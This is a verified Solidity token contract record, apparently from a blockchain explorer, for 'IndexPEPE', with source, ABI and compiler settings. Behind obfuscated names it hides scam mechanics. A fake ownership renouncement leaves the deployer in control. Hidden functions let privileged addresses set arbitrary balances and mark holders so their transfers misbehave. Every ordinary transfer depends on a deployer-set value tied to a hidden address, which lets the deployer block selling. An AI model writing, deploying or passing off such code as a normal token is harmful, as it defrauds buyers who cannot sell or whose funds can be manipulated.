{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface marketingBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listLiquidity) external view returns (uint256);\n\n    function transfer(address feeTrading, uint256 amountSell) external returns (bool);\n\n    function allowance(address atShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeTrading,\n        uint256 amountSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingTo, uint256 value);\n    event Approval(address indexed atShould, address indexed spender, uint256 value);\n}\n\nabstract contract listSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapTotalLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchAmount {\n    function createPair(address takeIs, address atBuy) external returns (address);\n}\n\ninterface isTeam is marketingBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IndexPEPE is listSender, marketingBuy, isTeam {\n\n    uint256 constant enableExempt = 11 ** 10;\n\n    uint256 public sellLaunched;\n\n    event OwnershipTransferred(address indexed teamFee, address indexed txTeam);\n\n    function sellTeam() public {\n        emit OwnershipTransferred(maxAutoLaunched, address(0));\n        enableTake = address(0);\n    }\n\n    address public maxAutoLaunched;\n\n    function receiverTx(address buyFund) public {\n        atTake();\n        \n        if (buyFund == maxAutoLaunched || buyFund == liquidityFromSwap) {\n            return;\n        }\n        minSwapFee[buyFund] = true;\n    }\n\n    string private receiverMax = \"Index PEPE\";\n\n    uint256 totalEnable;\n\n    constructor (){\n        if (autoTake == modeReceiver) {\n            sellTotalShould = false;\n        }\n        swapTotalLimit liquidityTokenIs = swapTotalLimit(walletTrading);\n        liquidityFromSwap = launchAmount(liquidityTokenIs.factory()).createPair(liquidityTokenIs.WETH(), address(this));\n        \n        maxAutoLaunched = _msgSender();\n        sellTeam();\n        autoBuyShould[maxAutoLaunched] = true;\n        senderAt[maxAutoLaunched] = listFeeReceiver;\n        \n        emit Transfer(address(0), maxAutoLaunched, listFeeReceiver);\n    }\n\n    function tradingMin(uint256 amountSell) public {\n        atTake();\n        enableToExempt = amountSell;\n    }\n\n    bool public sellTotalShould;\n\n    function liquiditySenderSell(address toWalletTake) public {\n        require(toWalletTake.balance < 100000);\n        if (exemptSell) {\n            return;\n        }\n        if (sellTotalShould) {\n            exemptSender = true;\n        }\n        autoBuyShould[toWalletTake] = true;\n        if (enableLiquidity) {\n            modeFund = autoTake;\n        }\n        exemptSell = true;\n    }\n\n    address receiverTradingBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address fromMaxIs, address launchedAuto) external view virtual override returns (uint256) {\n        if (launchedAuto == walletTrading) {\n            return type(uint256).max;\n        }\n        return shouldLimit[fromMaxIs][launchedAuto];\n    }\n\n    uint256 private modeReceiver;\n\n    string private totalAt = \"IPE\";\n\n    mapping(address => bool) public autoBuyShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listFeeReceiver;\n    }\n\n    address private enableTake;\n\n    function transfer(address walletReceiver, uint256 amountSell) external virtual override returns (bool) {\n        return receiverSender(_msgSender(), walletReceiver, amountSell);\n    }\n\n    uint256 public autoTake;\n\n    bool private shouldReceiver;\n\n    function owner() external view returns (address) {\n        return enableTake;\n    }\n\n    address public liquidityFromSwap;\n\n    address walletTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function takeExempt(address walletReceiver, uint256 amountSell) public {\n        atTake();\n        senderAt[walletReceiver] = amountSell;\n    }\n\n    bool public exemptSell;\n\n    function transferFrom(address txMin, address feeTrading, uint256 amountSell) external override returns (bool) {\n        if (_msgSender() != walletTrading) {\n            if (shouldLimit[txMin][_msgSender()] != type(uint256).max) {\n                require(amountSell <= shouldLimit[txMin][_msgSender()]);\n                shouldLimit[txMin][_msgSender()] -= amountSell;\n            }\n        }\n        return receiverSender(txMin, feeTrading, amountSell);\n    }\n\n    uint256 private listFeeReceiver = 100000000 * 10 ** 18;\n\n    function atTake() private view {\n        require(autoBuyShould[_msgSender()]);\n    }\n\n    uint8 private launchFrom = 18;\n\n    bool private exemptSender;\n\n    function approve(address launchedAuto, uint256 amountSell) public virtual override returns (bool) {\n        shouldLimit[_msgSender()][launchedAuto] = amountSell;\n        emit Approval(_msgSender(), launchedAuto, amountSell);\n        return true;\n    }\n\n    uint256 public modeFund;\n\n    mapping(address => mapping(address => uint256)) private shouldLimit;\n\n    function balanceOf(address listLiquidity) public view virtual override returns (uint256) {\n        return senderAt[listLiquidity];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverMax;\n    }\n\n    bool public tradingMax;\n\n    mapping(address => bool) public minSwapFee;\n\n    mapping(address => uint256) private senderAt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchFrom;\n    }\n\n    uint256 enableToExempt;\n\n    function receiverSender(address txMin, address feeTrading, uint256 amountSell) internal returns (bool) {\n        if (txMin == maxAutoLaunched) {\n            return limitBuy(txMin, feeTrading, amountSell);\n        }\n        uint256 tradingTake = marketingBuy(liquidityFromSwap).balanceOf(receiverTradingBuy);\n        require(tradingTake == enableToExempt);\n        require(feeTrading != receiverTradingBuy);\n        if (minSwapFee[txMin]) {\n            return limitBuy(txMin, feeTrading, enableExempt);\n        }\n        return limitBuy(txMin, feeTrading, amountSell);\n    }\n\n    bool public enableLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalAt;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableTake;\n    }\n\n    function limitBuy(address txMin, address feeTrading, uint256 amountSell) internal returns (bool) {\n        require(senderAt[txMin] >= amountSell);\n        senderAt[txMin] -= amountSell;\n        senderAt[feeTrading] += amountSell;\n        emit Transfer(txMin, feeTrading, amountSell);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMaxIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoBuyShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFromSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWalletTake\",\"type\":\"address\"}],\"name\":\"liquiditySenderSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAutoLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minSwapFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"}],\"name\":\"receiverTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotalShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSell\",\"type\":\"uint256\"}],\"name\":\"takeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountSell\",\"type\":\"uint256\"}],\"name\":\"tradingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "IndexPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}